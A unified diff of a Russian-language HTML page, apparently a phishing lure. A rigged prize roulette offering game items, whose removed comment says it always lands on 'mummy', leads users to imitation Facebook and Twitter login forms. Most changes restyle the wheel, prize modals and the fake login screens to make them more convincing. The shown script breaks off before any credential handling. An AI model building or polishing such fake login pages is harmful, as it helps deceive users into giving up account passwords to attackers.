@@ -9,7 +9,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
 
         body {
@@ -83,9 +83,9 @@
 
         .roulette-container {
             position: relative;
-            width: 350px;
-            height: 350px;
-            margin: 0 auto 25px;
+            width: 400px;
+            height: 400px;
+            margin: 0 auto 30px;
             pointer-events: none;
             user-select: none;
             -webkit-user-drag: none;
@@ -110,13 +110,14 @@
             width: 100%;
             height: 100%;
             z-index: 1;
+            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.3));
         }
 
         .wheel-base {
             width: 55%;
             height: 55%;
             z-index: 2;
-            filter: brightness(1.2);
+            filter: brightness(1.2) drop-shadow(0 0 15px rgba(255, 215, 0, 0.4));
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -124,21 +125,40 @@
             pointer-events: none;
         }
 
+        .wheel-glow {
+            position: absolute;
+            width: 120%;
+            height: 120%;
+            background: radial-gradient(circle, rgba(255,215,0,0.3) 0%, transparent 70%);
+            z-index: 0;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .spinning .wheel-glow {
+            opacity: 1;
+            animation: glowPulse 1s infinite alternate;
+        }
+
         .spin-button {
             display: block;
-            margin: 25px auto;
-            padding: 15px 50px;
-            font-size: 1.5rem;
+            margin: 30px auto;
+            padding: 18px 60px;
+            font-size: 1.6rem;
             font-weight: bold;
-            color: black;
-            background: linear-gradient(45deg, gold, #ffd700);
+            color: #000;
+            background: linear-gradient(45deg, gold, #ffd700, #ffcc00, gold);
             border: none;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            letter-spacing: 3px;
+            box-shadow: 0 0 25px rgba(255, 215, 0, 0.8),
+                        0 5px 15px rgba(0, 0, 0, 0.3);
             position: relative;
             overflow: hidden;
             z-index: 3;
@@ -146,15 +166,17 @@
         }
 
         .spin-button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(255, 215, 0, 1);
-            background: linear-gradient(45deg, #ffd700, gold);
+            transform: scale(1.05) translateY(-3px);
+            box-shadow: 0 0 35px rgba(255, 215, 0, 1),
+                        0 8px 20px rgba(0, 0, 0, 0.4);
+            background: linear-gradient(45deg, #ffcc00, gold, #ffcc00);
         }
 
         .spin-button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
+            transform: none !important;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
         }
 
         .spin-button::before {
@@ -164,13 +186,56 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.4), transparent);
             transform: rotate(45deg);
             transition: all 0.5s;
         }
 
         .spin-button:hover::before {
             left: 100%;
+        }
+
+        .spin-button::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            right: 2px;
+            bottom: 2px;
+            border-radius: 48px;
+            background: linear-gradient(45deg, rgba(255,255,255,0.1), transparent);
+            z-index: -1;
+        }
+
+        /* Анимации приза */
+        .prize-animation {
+            animation: prizeGlow 2s infinite alternate,
+                       prizeFloat 3s infinite ease-in-out;
+            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.7));
+            position: relative;
+        }
+
+        .prize-glow-effect {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 120%;
+            height: 120%;
+            background: radial-gradient(circle, rgba(255,215,0,0.4) 0%, transparent 70%);
+            border-radius: 50%;
+            z-index: -1;
+            animation: glowExpand 3s infinite alternate;
+        }
+
+        .mummy-container {
+            position: relative;
+            display: inline-block;
+        }
+
+        .mummy-container .prize-image {
+            background: transparent !important;
+            filter: drop-shadow(0 0 15px rgba(255, 165, 0, 0.6));
         }
 
         /* Модальные окна */
@@ -192,213 +257,305 @@
 
         .modal-content {
             background: #000;
-            border-radius: 10px;
+            border-radius: 15px;
             padding: 0;
             width: 100%;
-            max-width: 400px;
-            min-height: 600px;
+            max-width: 450px;
+            min-height: 650px;
             text-align: center;
             position: relative;
             overflow: hidden;
-            border: 2px solid #333;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.2);
+            animation: modalSlideUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .modal-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, gold, transparent);
         }
 
         /* Стили для окна выигрыша */
         .win-modal-header {
-            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
-            padding: 25px 20px;
+            background: linear-gradient(135deg, rgba(26, 26, 26, 0.9) 0%, rgba(51, 51, 51, 0.9) 100%);
+            padding: 30px 25px;
             border-bottom: 2px solid gold;
+            position: relative;
+        }
+
+        .win-modal-header::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 20%;
+            right: 20%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, gold, transparent);
         }
 
         .prize-image-container {
             width: 100%;
-            padding: 30px;
-            background: #111;
+            padding: 40px;
+            background: linear-gradient(180deg, rgba(17, 17, 17, 0.9) 0%, rgba(34, 34, 34, 0.9) 100%);
+            position: relative;
+            min-height: 250px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .prize-image {
-            max-width: 200px;
-            max-height: 200px;
+            max-width: 220px;
+            max-height: 220px;
             width: 100%;
             height: auto;
-            border-radius: 10px;
+            border-radius: 15px;
             border: 3px solid gold;
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5),
+                        inset 0 0 20px rgba(255, 215, 0, 0.2);
+            background: transparent !important;
+            transition: transform 0.3s ease;
+        }
+
+        .prize-image:hover {
+            transform: scale(1.05);
         }
 
         .login-options {
-            padding: 25px 20px;
-            background: #222;
+            padding: 30px 25px;
+            background: rgba(34, 34, 34, 0.95);
         }
 
         .login-options h3 {
-            color: #fff;
-            margin-bottom: 25px;
-            font-size: 1.4rem;
+            color: gold;
+            margin-bottom: 30px;
+            font-size: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
         }
 
         .checkbox-option {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 15px;
-            background: #333;
-            border-radius: 8px;
-            margin-bottom: 15px;
+            padding: 18px 20px;
+            background: rgba(51, 51, 51, 0.8);
+            border-radius: 10px;
+            margin-bottom: 20px;
             cursor: pointer;
             transition: all 0.3s;
             border: 2px solid transparent;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .checkbox-option::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .checkbox-option:hover::before {
+            left: 100%;
         }
 
         .checkbox-option:hover {
-            background: #444;
-            border-color: #555;
+            background: rgba(68, 68, 68, 0.9);
+            border-color: rgba(255, 215, 0, 0.5);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
 
         .checkbox-option.active {
-            background: #444;
+            background: rgba(68, 68, 68, 0.95);
             border-color: gold;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
         }
 
         .checkbox-option-content {
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 20px;
             width: 100%;
         }
 
         .social-icon {
-            width: 30px;
-            height: 30px;
+            width: 40px;
+            height: 40px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.3rem;
+            font-size: 1.4rem;
             font-weight: bold;
-            border-radius: 5px;
+            border-radius: 8px;
+            transition: transform 0.3s;
+        }
+
+        .checkbox-option:hover .social-icon {
+            transform: scale(1.1);
         }
 
         .facebook-icon {
-            background: #1877f2;
+            background: linear-gradient(135deg, #1877f2, #0d5cb6);
             color: white;
         }
 
         .twitter-icon {
-            background: #1da1f2;
+            background: linear-gradient(135deg, #1da1f2, #0c85d0);
             color: white;
         }
 
         .checkbox-option span {
             color: #fff;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             font-weight: bold;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
         }
 
         .checkbox-icon {
-            width: 24px;
-            height: 24px;
+            width: 28px;
+            height: 28px;
             border-radius: 50%;
             border: 2px solid #666;
             display: flex;
             align-items: center;
             justify-content: center;
             transition: all 0.3s;
+            position: relative;
+        }
+
+        .checkbox-icon::before {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 0;
+            background: gold;
+            border-radius: 50%;
+            transition: all 0.3s;
         }
 
         .checkbox-option.active .checkbox-icon {
-            background: gold;
             border-color: gold;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
         }
 
-        .checkbox-option.active .checkbox-icon::after {
-            content: '✓';
-            color: #000;
-            font-weight: bold;
+        .checkbox-option.active .checkbox-icon::before {
+            width: 16px;
+            height: 16px;
+            background: gold;
+            animation: checkPop 0.3s ease;
         }
 
         .modal-buttons {
-            padding: 20px;
-            background: #111;
+            padding: 25px;
+            background: rgba(17, 17, 17, 0.95);
             display: flex;
-            gap: 15px;
-            border-top: 1px solid #333;
+            gap: 20px;
+            border-top: 1px solid rgba(255, 215, 0, 0.2);
         }
 
         .modal-button {
             flex: 1;
-            padding: 15px;
+            padding: 16px;
             border: none;
-            border-radius: 8px;
-            font-size: 1.1rem;
+            border-radius: 10px;
+            font-size: 1.2rem;
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .modal-button.cancel {
-            background: #333;
+            background: linear-gradient(135deg, #333, #444);
             color: #ccc;
         }
 
         .modal-button.ok {
-            background: gold;
+            background: linear-gradient(135deg, gold, #ffcc00);
             color: #000;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
         }
 
         .modal-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .modal-button.cancel:hover {
+            background: linear-gradient(135deg, #444, #555);
+        }
+
+        .modal-button.ok:hover {
+            background: linear-gradient(135deg, #ffcc00, gold);
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.4);
         }
 
         /* Стили для Facebook окна */
         .facebook-modal-content {
-            background: #f0f2f5;
+            background: linear-gradient(180deg, #f0f2f5 0%, #e4e6eb 100%);
             color: #000;
-            min-height: 600px;
+            min-height: 650px;
+            border: 2px solid #1877f2;
         }
 
         .facebook-header {
             background: #fff;
-            padding: 20px;
+            padding: 25px;
             text-align: center;
             border-bottom: 1px solid #ddd;
         }
 
         .facebook-logo {
             color: #1877f2;
-            font-size: 3rem;
+            font-size: 3.2rem;
             font-weight: bold;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             letter-spacing: -1px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
         }
 
         .facebook-subtitle {
             color: #1c1e21;
-            font-size: 1rem;
-            max-width: 300px;
+            font-size: 1.1rem;
+            max-width: 320px;
             margin: 0 auto;
-            line-height: 1.4;
+            line-height: 1.5;
             font-weight: normal;
         }
 
         .facebook-form {
-            padding: 20px;
+            padding: 25px;
             background: #fff;
-            margin: 15px;
-            border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            margin: 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
 
         .facebook-input {
             width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
+            padding: 16px;
+            margin-bottom: 15px;
             border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 1rem;
+            border-radius: 8px;
+            font-size: 1.1rem;
             background: #fff;
             color: #1c1e21;
+            transition: all 0.3s;
         }
 
         .facebook-input::placeholder {
@@ -408,33 +565,36 @@
         .facebook-input:focus {
             outline: none;
             border-color: #1877f2;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+            transform: translateY(-1px);
         }
 
         .facebook-login-button {
             width: 100%;
-            padding: 14px;
-            background: #1877f2;
+            padding: 16px;
+            background: linear-gradient(135deg, #1877f2, #166fe5);
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 1.1rem;
+            border-radius: 8px;
+            font-size: 1.2rem;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 15px;
-            transition: background-color 0.3s;
+            margin-bottom: 20px;
+            transition: all 0.3s;
         }
 
         .facebook-login-button:hover {
-            background: #166fe5;
+            background: linear-gradient(135deg, #166fe5, #1877f2);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
         }
 
         .facebook-divider {
             text-align: center;
-            margin: 20px 0;
+            margin: 25px 0;
             color: #8a8d91;
             position: relative;
-            font-size: 0.9rem;
+            font-size: 1rem;
         }
 
         .facebook-divider::before {
@@ -449,69 +609,74 @@
 
         .facebook-divider span {
             background: #fff;
-            padding: 0 15px;
+            padding: 0 20px;
             position: relative;
         }
 
         .facebook-create-button {
-            width: 70%;
-            padding: 12px;
-            background: #42b72a;
+            width: 75%;
+            padding: 14px;
+            background: linear-gradient(135deg, #42b72a, #36a420);
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 1rem;
+            border-radius: 8px;
+            font-size: 1.1rem;
             font-weight: bold;
             cursor: pointer;
-            margin: 0 auto 15px;
+            margin: 0 auto 20px;
             display: block;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
         }
 
         .facebook-create-button:hover {
-            background: #36a420;
+            background: linear-gradient(135deg, #36a420, #42b72a);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(66, 183, 42, 0.4);
         }
 
         .facebook-links {
             text-align: center;
-            margin-top: 20px;
-            padding-top: 15px;
+            margin-top: 25px;
+            padding-top: 20px;
             border-top: 1px solid #dddfe2;
         }
 
         .facebook-links a {
             color: #1877f2;
             text-decoration: none;
-            font-size: 0.85rem;
+            font-size: 0.9rem;
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
+            transition: all 0.3s;
         }
 
         .facebook-links a:hover {
             text-decoration: underline;
+            transform: translateX(5px);
         }
 
         .facebook-language {
             background: #fff;
-            padding: 15px 20px;
-            margin-top: 15px;
+            padding: 20px;
+            margin-top: 20px;
             border-top: 1px solid #dddfe2;
         }
 
         .facebook-language select {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             border: 1px solid #dddfe2;
-            border-radius: 4px;
+            border-radius: 6px;
             background: white;
             color: #1c1e21;
-            font-size: 0.85rem;
+            font-size: 0.9rem;
+            cursor: pointer;
         }
 
         .facebook-footer {
             background: #fff;
-            padding: 15px 20px;
-            font-size: 0.75rem;
+            padding: 20px;
+            font-size: 0.8rem;
             color: #8a8d91;
             text-align: center;
             border-top: 1px solid #dddfe2;
@@ -521,78 +686,96 @@
         .twitter-modal-content {
             background: #000;
             color: #fff;
-            min-height: 600px;
+            min-height: 650px;
+            border: 2px solid #1da1f2;
         }
 
         .twitter-header {
-            padding: 25px 20px;
+            padding: 30px 25px;
             text-align: center;
             border-bottom: 1px solid #333;
         }
 
         .twitter-logo {
             color: #1da1f2;
-            font-size: 2.5rem;
-            margin-bottom: 15px;
+            font-size: 2.8rem;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px rgba(29, 161, 242, 0.5);
         }
 
         .twitter-title {
-            font-size: 1.8rem;
+            font-size: 2rem;
             font-weight: bold;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
         }
 
         .twitter-subtitle {
             color: #999;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
         }
 
         .twitter-form {
-            padding: 25px 20px;
+            padding: 30px 25px;
         }
 
         .twitter-input {
             width: 100%;
-            padding: 15px;
-            margin-bottom: 20px;
-            background: transparent;
+            padding: 16px;
+            margin-bottom: 25px;
+            background: rgba(255, 255, 255, 0.05);
             border: 2px solid #333;
-            border-radius: 4px;
+            border-radius: 8px;
             color: white;
-            font-size: 1rem;
+            font-size: 1.1rem;
+            transition: all 0.3s;
         }
 
         .twitter-input:focus {
             outline: none;
             border-color: #1da1f2;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(29, 161, 242, 0.2);
         }
 
         .twitter-next-button {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background: #fff;
             color: #000;
             border: none;
             border-radius: 50px;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            transition: all 0.3s;
+        }
+
+        .twitter-next-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 255, 255, 0.2);
         }
 
         .twitter-forgot {
             color: #1da1f2;
             text-decoration: none;
-            font-size: 0.9rem;
+            font-size: 1rem;
             display: block;
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 35px;
+            transition: all 0.3s;
+        }
+
+        .twitter-forgot:hover {
+            text-decoration: underline;
+            transform: scale(1.05);
         }
 
         .twitter-divider {
             display: flex;
             align-items: center;
-            margin: 25px 0;
+            margin: 30px 0;
             color: #666;
         }
 
@@ -605,58 +788,80 @@
         }
 
         .twitter-divider span {
-            padding: 0 15px;
+            padding: 0 20px;
+            font-size: 0.9rem;
         }
 
         .twitter-google-button {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background: transparent;
             border: 1px solid #333;
             border-radius: 50px;
             color: white;
-            font-size: 1rem;
+            font-size: 1.1rem;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 15px;
+            transition: all 0.3s;
+        }
+
+        .twitter-google-button:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: #1da1f2;
+            transform: translateY(-2px);
         }
 
         .twitter-apple-button {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background: transparent;
             border: 1px solid #333;
             border-radius: 50px;
             color: white;
-            font-size: 1rem;
+            font-size: 1.1rem;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 30px;
+            margin-bottom: 35px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 15px;
+            transition: all 0.3s;
+        }
+
+        .twitter-apple-button:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: #666;
+            transform: translateY(-2px);
         }
 
         .twitter-signup {
             text-align: center;
             color: #666;
-            margin-top: 20px;
+            margin-top: 25px;
+            font-size: 1rem;
         }
 
         .twitter-signup a {
             color: #1da1f2;
             text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .twitter-signup a:hover {
+            text-decoration: underline;
         }
 
         .twitter-footer {
-            padding: 20px;
+            padding: 25px;
             border-top: 1px solid #333;
-            font-size: 0.8rem;
+            font-size: 0.85rem;
             color: #666;
             text-align: center;
         }
@@ -665,45 +870,57 @@
         .success-modal-content {
             background: #000;
             border: 3px solid gold;
-            min-height: 500px;
+            min-height: 550px;
+            box-shadow: 0 0 50px rgba(255, 215, 0, 0.3);
         }
 
         .success-header {
-            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
-            padding: 25px 20px;
+            background: linear-gradient(135deg, rgba(26, 26, 26, 0.95) 0%, rgba(51, 51, 51, 0.95) 100%);
+            padding: 30px 25px;
             border-bottom: 2px solid gold;
         }
 
         .success-prize-container {
-            padding: 30px;
-            background: #111;
+            padding: 40px;
+            background: linear-gradient(180deg, rgba(17, 17, 17, 0.9) 0%, rgba(34, 34, 34, 0.9) 100%);
+            position: relative;
+            min-height: 250px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .success-prize-image {
-            max-width: 150px;
-            max-height: 150px;
+            max-width: 180px;
+            max-height: 180px;
             width: 100%;
             height: auto;
-            border-radius: 10px;
+            border-radius: 15px;
             border: 3px solid gold;
-            box-shadow: 0 0 25px rgba(255, 215, 0, 0.4);
+            box-shadow: 0 0 35px rgba(255, 215, 0, 0.6),
+                        inset 0 0 25px rgba(255, 215, 0, 0.3);
+            animation: prizeCelebration 2s infinite alternate;
         }
 
         .success-message {
-            padding: 25px 20px;
-            background: #222;
+            padding: 30px 25px;
+            background: rgba(34, 34, 34, 0.95);
             text-align: center;
         }
 
         .success-message h3 {
             color: gold;
-            font-size: 1.8rem;
-            margin-bottom: 10px;
+            font-size: 2rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+            animation: textGlow 2s infinite alternate;
         }
 
         .success-message p {
             color: #ccc;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            line-height: 1.5;
         }
 
         /* Анимации */
@@ -712,20 +929,149 @@
             to { opacity: 1; }
         }
 
+        @keyframes modalSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
         @keyframes wheelGlow {
-            0% { filter: drop-shadow(0 0 5px gold); }
-            50% { filter: drop-shadow(0 0 20px gold); }
-            100% { filter: drop-shadow(0 0 5px gold); }
+            0% { filter: drop-shadow(0 0 10px gold) brightness(1); }
+            50% { filter: drop-shadow(0 0 30px gold) brightness(1.2); }
+            100% { filter: drop-shadow(0 0 10px gold) brightness(1); }
+        }
+
+        @keyframes glowPulse {
+            0% { opacity: 0.3; transform: translate(-50%, -50%) scale(0.9); }
+            100% { opacity: 0.7; transform: translate(-50%, -50%) scale(1.1); }
+        }
+
+        @keyframes spinButtonGlow {
+            0% { box-shadow: 0 0 25px rgba(255, 215, 0, 0.8); }
+            50% { box-shadow: 0 0 40px rgba(255, 215, 0, 1); }
+            100% { box-shadow: 0 0 25px rgba(255, 215, 0, 0.8); }
+        }
+
+        @keyframes checkPop {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes prizeGlow {
+            0% {
+                filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.7));
+                border-color: gold;
+            }
+            100% {
+                filter: drop-shadow(0 0 30px rgba(255, 215, 0, 1));
+                border-color: #ffcc00;
+            }
+        }
+
+        @keyframes prizeFloat {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(2deg); }
+        }
+
+        @keyframes glowExpand {
+            0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.3; }
+            100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.6; }
+        }
+
+        @keyframes prizeCelebration {
+            0% {
+                transform: scale(1) rotate(0deg);
+                box-shadow: 0 0 25px rgba(255, 215, 0, 0.6);
+            }
+            50% {
+                transform: scale(1.1) rotate(5deg);
+                box-shadow: 0 0 40px rgba(255, 215, 0, 0.8);
+            }
+            100% {
+                transform: scale(1) rotate(0deg);
+                box-shadow: 0 0 25px rgba(255, 215, 0, 0.6);
+            }
+        }
+
+        @keyframes textGlow {
+            0% {
+                text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+                color: gold;
+            }
+            100% {
+                text-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+                color: #ffcc00;
+            }
+        }
+
+        @keyframes backgroundSlide {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 100% 100%; }
         }
 
         .spinning {
             animation: wheelGlow 1s infinite;
         }
 
+        .prize-image.animated {
+            animation: prizeGlow 2s infinite alternate,
+                       prizeFloat 3s infinite ease-in-out;
+        }
+
+        /* Специальные стили для mummy приза */
+        #winPrizeImage[src*="mummy.png"],
+        #successPrizeImage[src*="mummy.png"] {
+            background: transparent !important;
+            filter: drop-shadow(0 0 25px rgba(255, 165, 0, 0.8)) !important;
+        }
+
+        .mummy-special {
+            position: relative;
+        }
+
+        .mummy-special::after {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            background: radial-gradient(circle, rgba(255,165,0,0.3) 0%, transparent 70%);
+            border-radius: 20px;
+            z-index: -1;
+            animation: mummyPulse 3s infinite;
+        }
+
+        @keyframes mummyPulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.6; }
+        }
+
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        .particle {
+            position: absolute;
+            background: gold;
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
         @media (max-width: 768px) {
             .roulette-container {
-                width: 300px;
-                height: 300px;
+                width: 350px;
+                height: 350px;
             }
             
             .wheel-base {
@@ -734,9 +1080,9 @@
             }
             
             .spin-button {
-                padding: 12px 40px;
-                font-size: 1.3rem;
-                margin: 20px auto;
+                padding: 16px 50px;
+                font-size: 1.4rem;
+                margin: 25px auto;
             }
 
             .modal-content {
@@ -745,19 +1091,24 @@
             }
 
             .facebook-modal-content {
-                min-height: 550px;
+                min-height: 600px;
+            }
+
+            .prize-image {
+                max-width: 180px;
+                max-height: 180px;
             }
         }
 
         @media (max-width: 480px) {
             .container {
-                padding: 30px 20px;
+                padding: 30px 15px;
             }
             
             .roulette-container {
-                width: 280px;
-                height: 280px;
-                margin-bottom: 20px;
+                width: 320px;
+                height: 320px;
+                margin-bottom: 25px;
             }
             
             .wheel-base {
@@ -766,22 +1117,28 @@
             }
             
             .spin-button {
-                padding: 10px 30px;
-                font-size: 1.2rem;
-                margin: 15px auto;
+                padding: 14px 40px;
+                font-size: 1.3rem;
+                margin: 20px auto;
+                letter-spacing: 2px;
             }
 
             .prize-image {
-                max-width: 150px;
-                max-height: 150px;
+                max-width: 160px;
+                max-height: 160px;
             }
 
             .facebook-logo {
-                font-size: 2.5rem;
+                font-size: 2.8rem;
             }
 
             .facebook-subtitle {
-                font-size: 0.9rem;
+                font-size: 1rem;
+            }
+
+            .modal-content {
+                max-width: 98%;
+                margin: 10px;
             }
         }
     </style>
@@ -795,6 +1152,7 @@
 
     <div class="container">
         <div class="roulette-container">
+            <div class="wheel-glow"></div>
             <div class="wheel-container">
                 <img src="wheel.png" alt="Колесо рулетки" class="wheel prize-wheel" id="prizeWheel">
                 <img src="wheel_base.png" alt="Основание колеса" class="wheel wheel-base" id="wheelBase">
@@ -808,11 +1166,13 @@
     <div class="modal-overlay" id="winModal">
         <div class="modal-content">
             <div class="win-modal-header">
-                <!-- Текст удален как указано -->
             </div>
             
             <div class="prize-image-container">
-                <img id="winPrizeImage" class="prize-image" alt="Выигрыш">
+                <div class="mummy-container">
+                    <img id="winPrizeImage" class="prize-image" alt="Выигрыш">
+                    <div class="prize-glow-effect"></div>
+                </div>
             </div>
             
             <div class="login-options">
@@ -929,11 +1289,12 @@
     <div class="modal-overlay" id="successModal">
         <div class="modal-content success-modal-content">
             <div class="success-header">
-                <!-- Текст удален как указано -->
             </div>
             
             <div class="success-prize-container">
-                <img id="successPrizeImage" class="success-prize-image" alt="Выигрыш">
+                <div class="mummy-special">
+                    <img id="successPrizeImage" class="success-prize-image" alt="Выигрыш">
+                </div>
             </div>
             
             <div class="success-message">
@@ -950,12 +1311,12 @@
     </div>
 
     <script>
-        // Конфигурация призов (mummy находится на 4-й позиции, индекс 3)
+        // Конфигурация призов
         const prizes = [
             { name: "pharaon", image: "pharaon.png" },
             { name: "material", image: "material.png" },
             { name: "m416lednik", image: "m416lednik.png" },
-            { name: "mummy", image: "mummy.png" }, // Это 4-й приз, индекс 3 - МУМИЯ
+            { name: "mummy", image: "mummy.png" },
             { name: "m416shut", image: "m416shut.png" },
             { name: "8500uc", image: "8500uc.png" },
             { name: "shorti", image: "shorti.png" },
@@ -973,6 +1334,7 @@
         // Элементы DOM
         const spinButton = document.getElementById('spinButton');
         const prizeWheel = document.getElementById('prizeWheel');
+        const wheelGlow = document.querySelector('.wheel-glow');
         const winModal = document.getElementById('winModal');
         const facebookModal = document.getElementById('facebookModal');
         const twitterModal = document.getElementById('twitterModal');
@@ -986,14 +1348,13 @@
         const confirmLogin = document.getElementById('confirmLogin');
 
         let isSpinning = false;
-        let hasSpun = false; // Флаг для ограничения одного вращения
+        let hasSpun = false;
         let currentRotation = 0;
         let currentPrize = null;
-        let selectedLoginOption = 'facebook'; // По умолчанию Facebook
+        let selectedLoginOption = 'facebook';
 
         // Инициализация
         function initialize() {
-            // Сброс состояния при загрузке страницы
             hasSpun = false;
             spinButton.disabled = false;
             spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
@@ -1001,56 +1362,121 @@
             prizeWheel.style.transform = 'rotate(0deg)';
             currentRotation = 0;
             
-            // Установка выбора по умолчанию
             facebookOption.classList.add('active');
             twitterOption.classList.remove('active');
             selectedLoginOption = 'facebook';
+            
+            // Добавляем свечение кнопки
+            spinButton.style.animation = 'spinButtonGlow 2s infinite';
         }
 
-        // Функция вращения рулетки (ВСЕГДА на Mummy)
+        // Функция вращения рулетки
         function spinRoulette() {
             if (isSpinning || hasSpun) return;
             
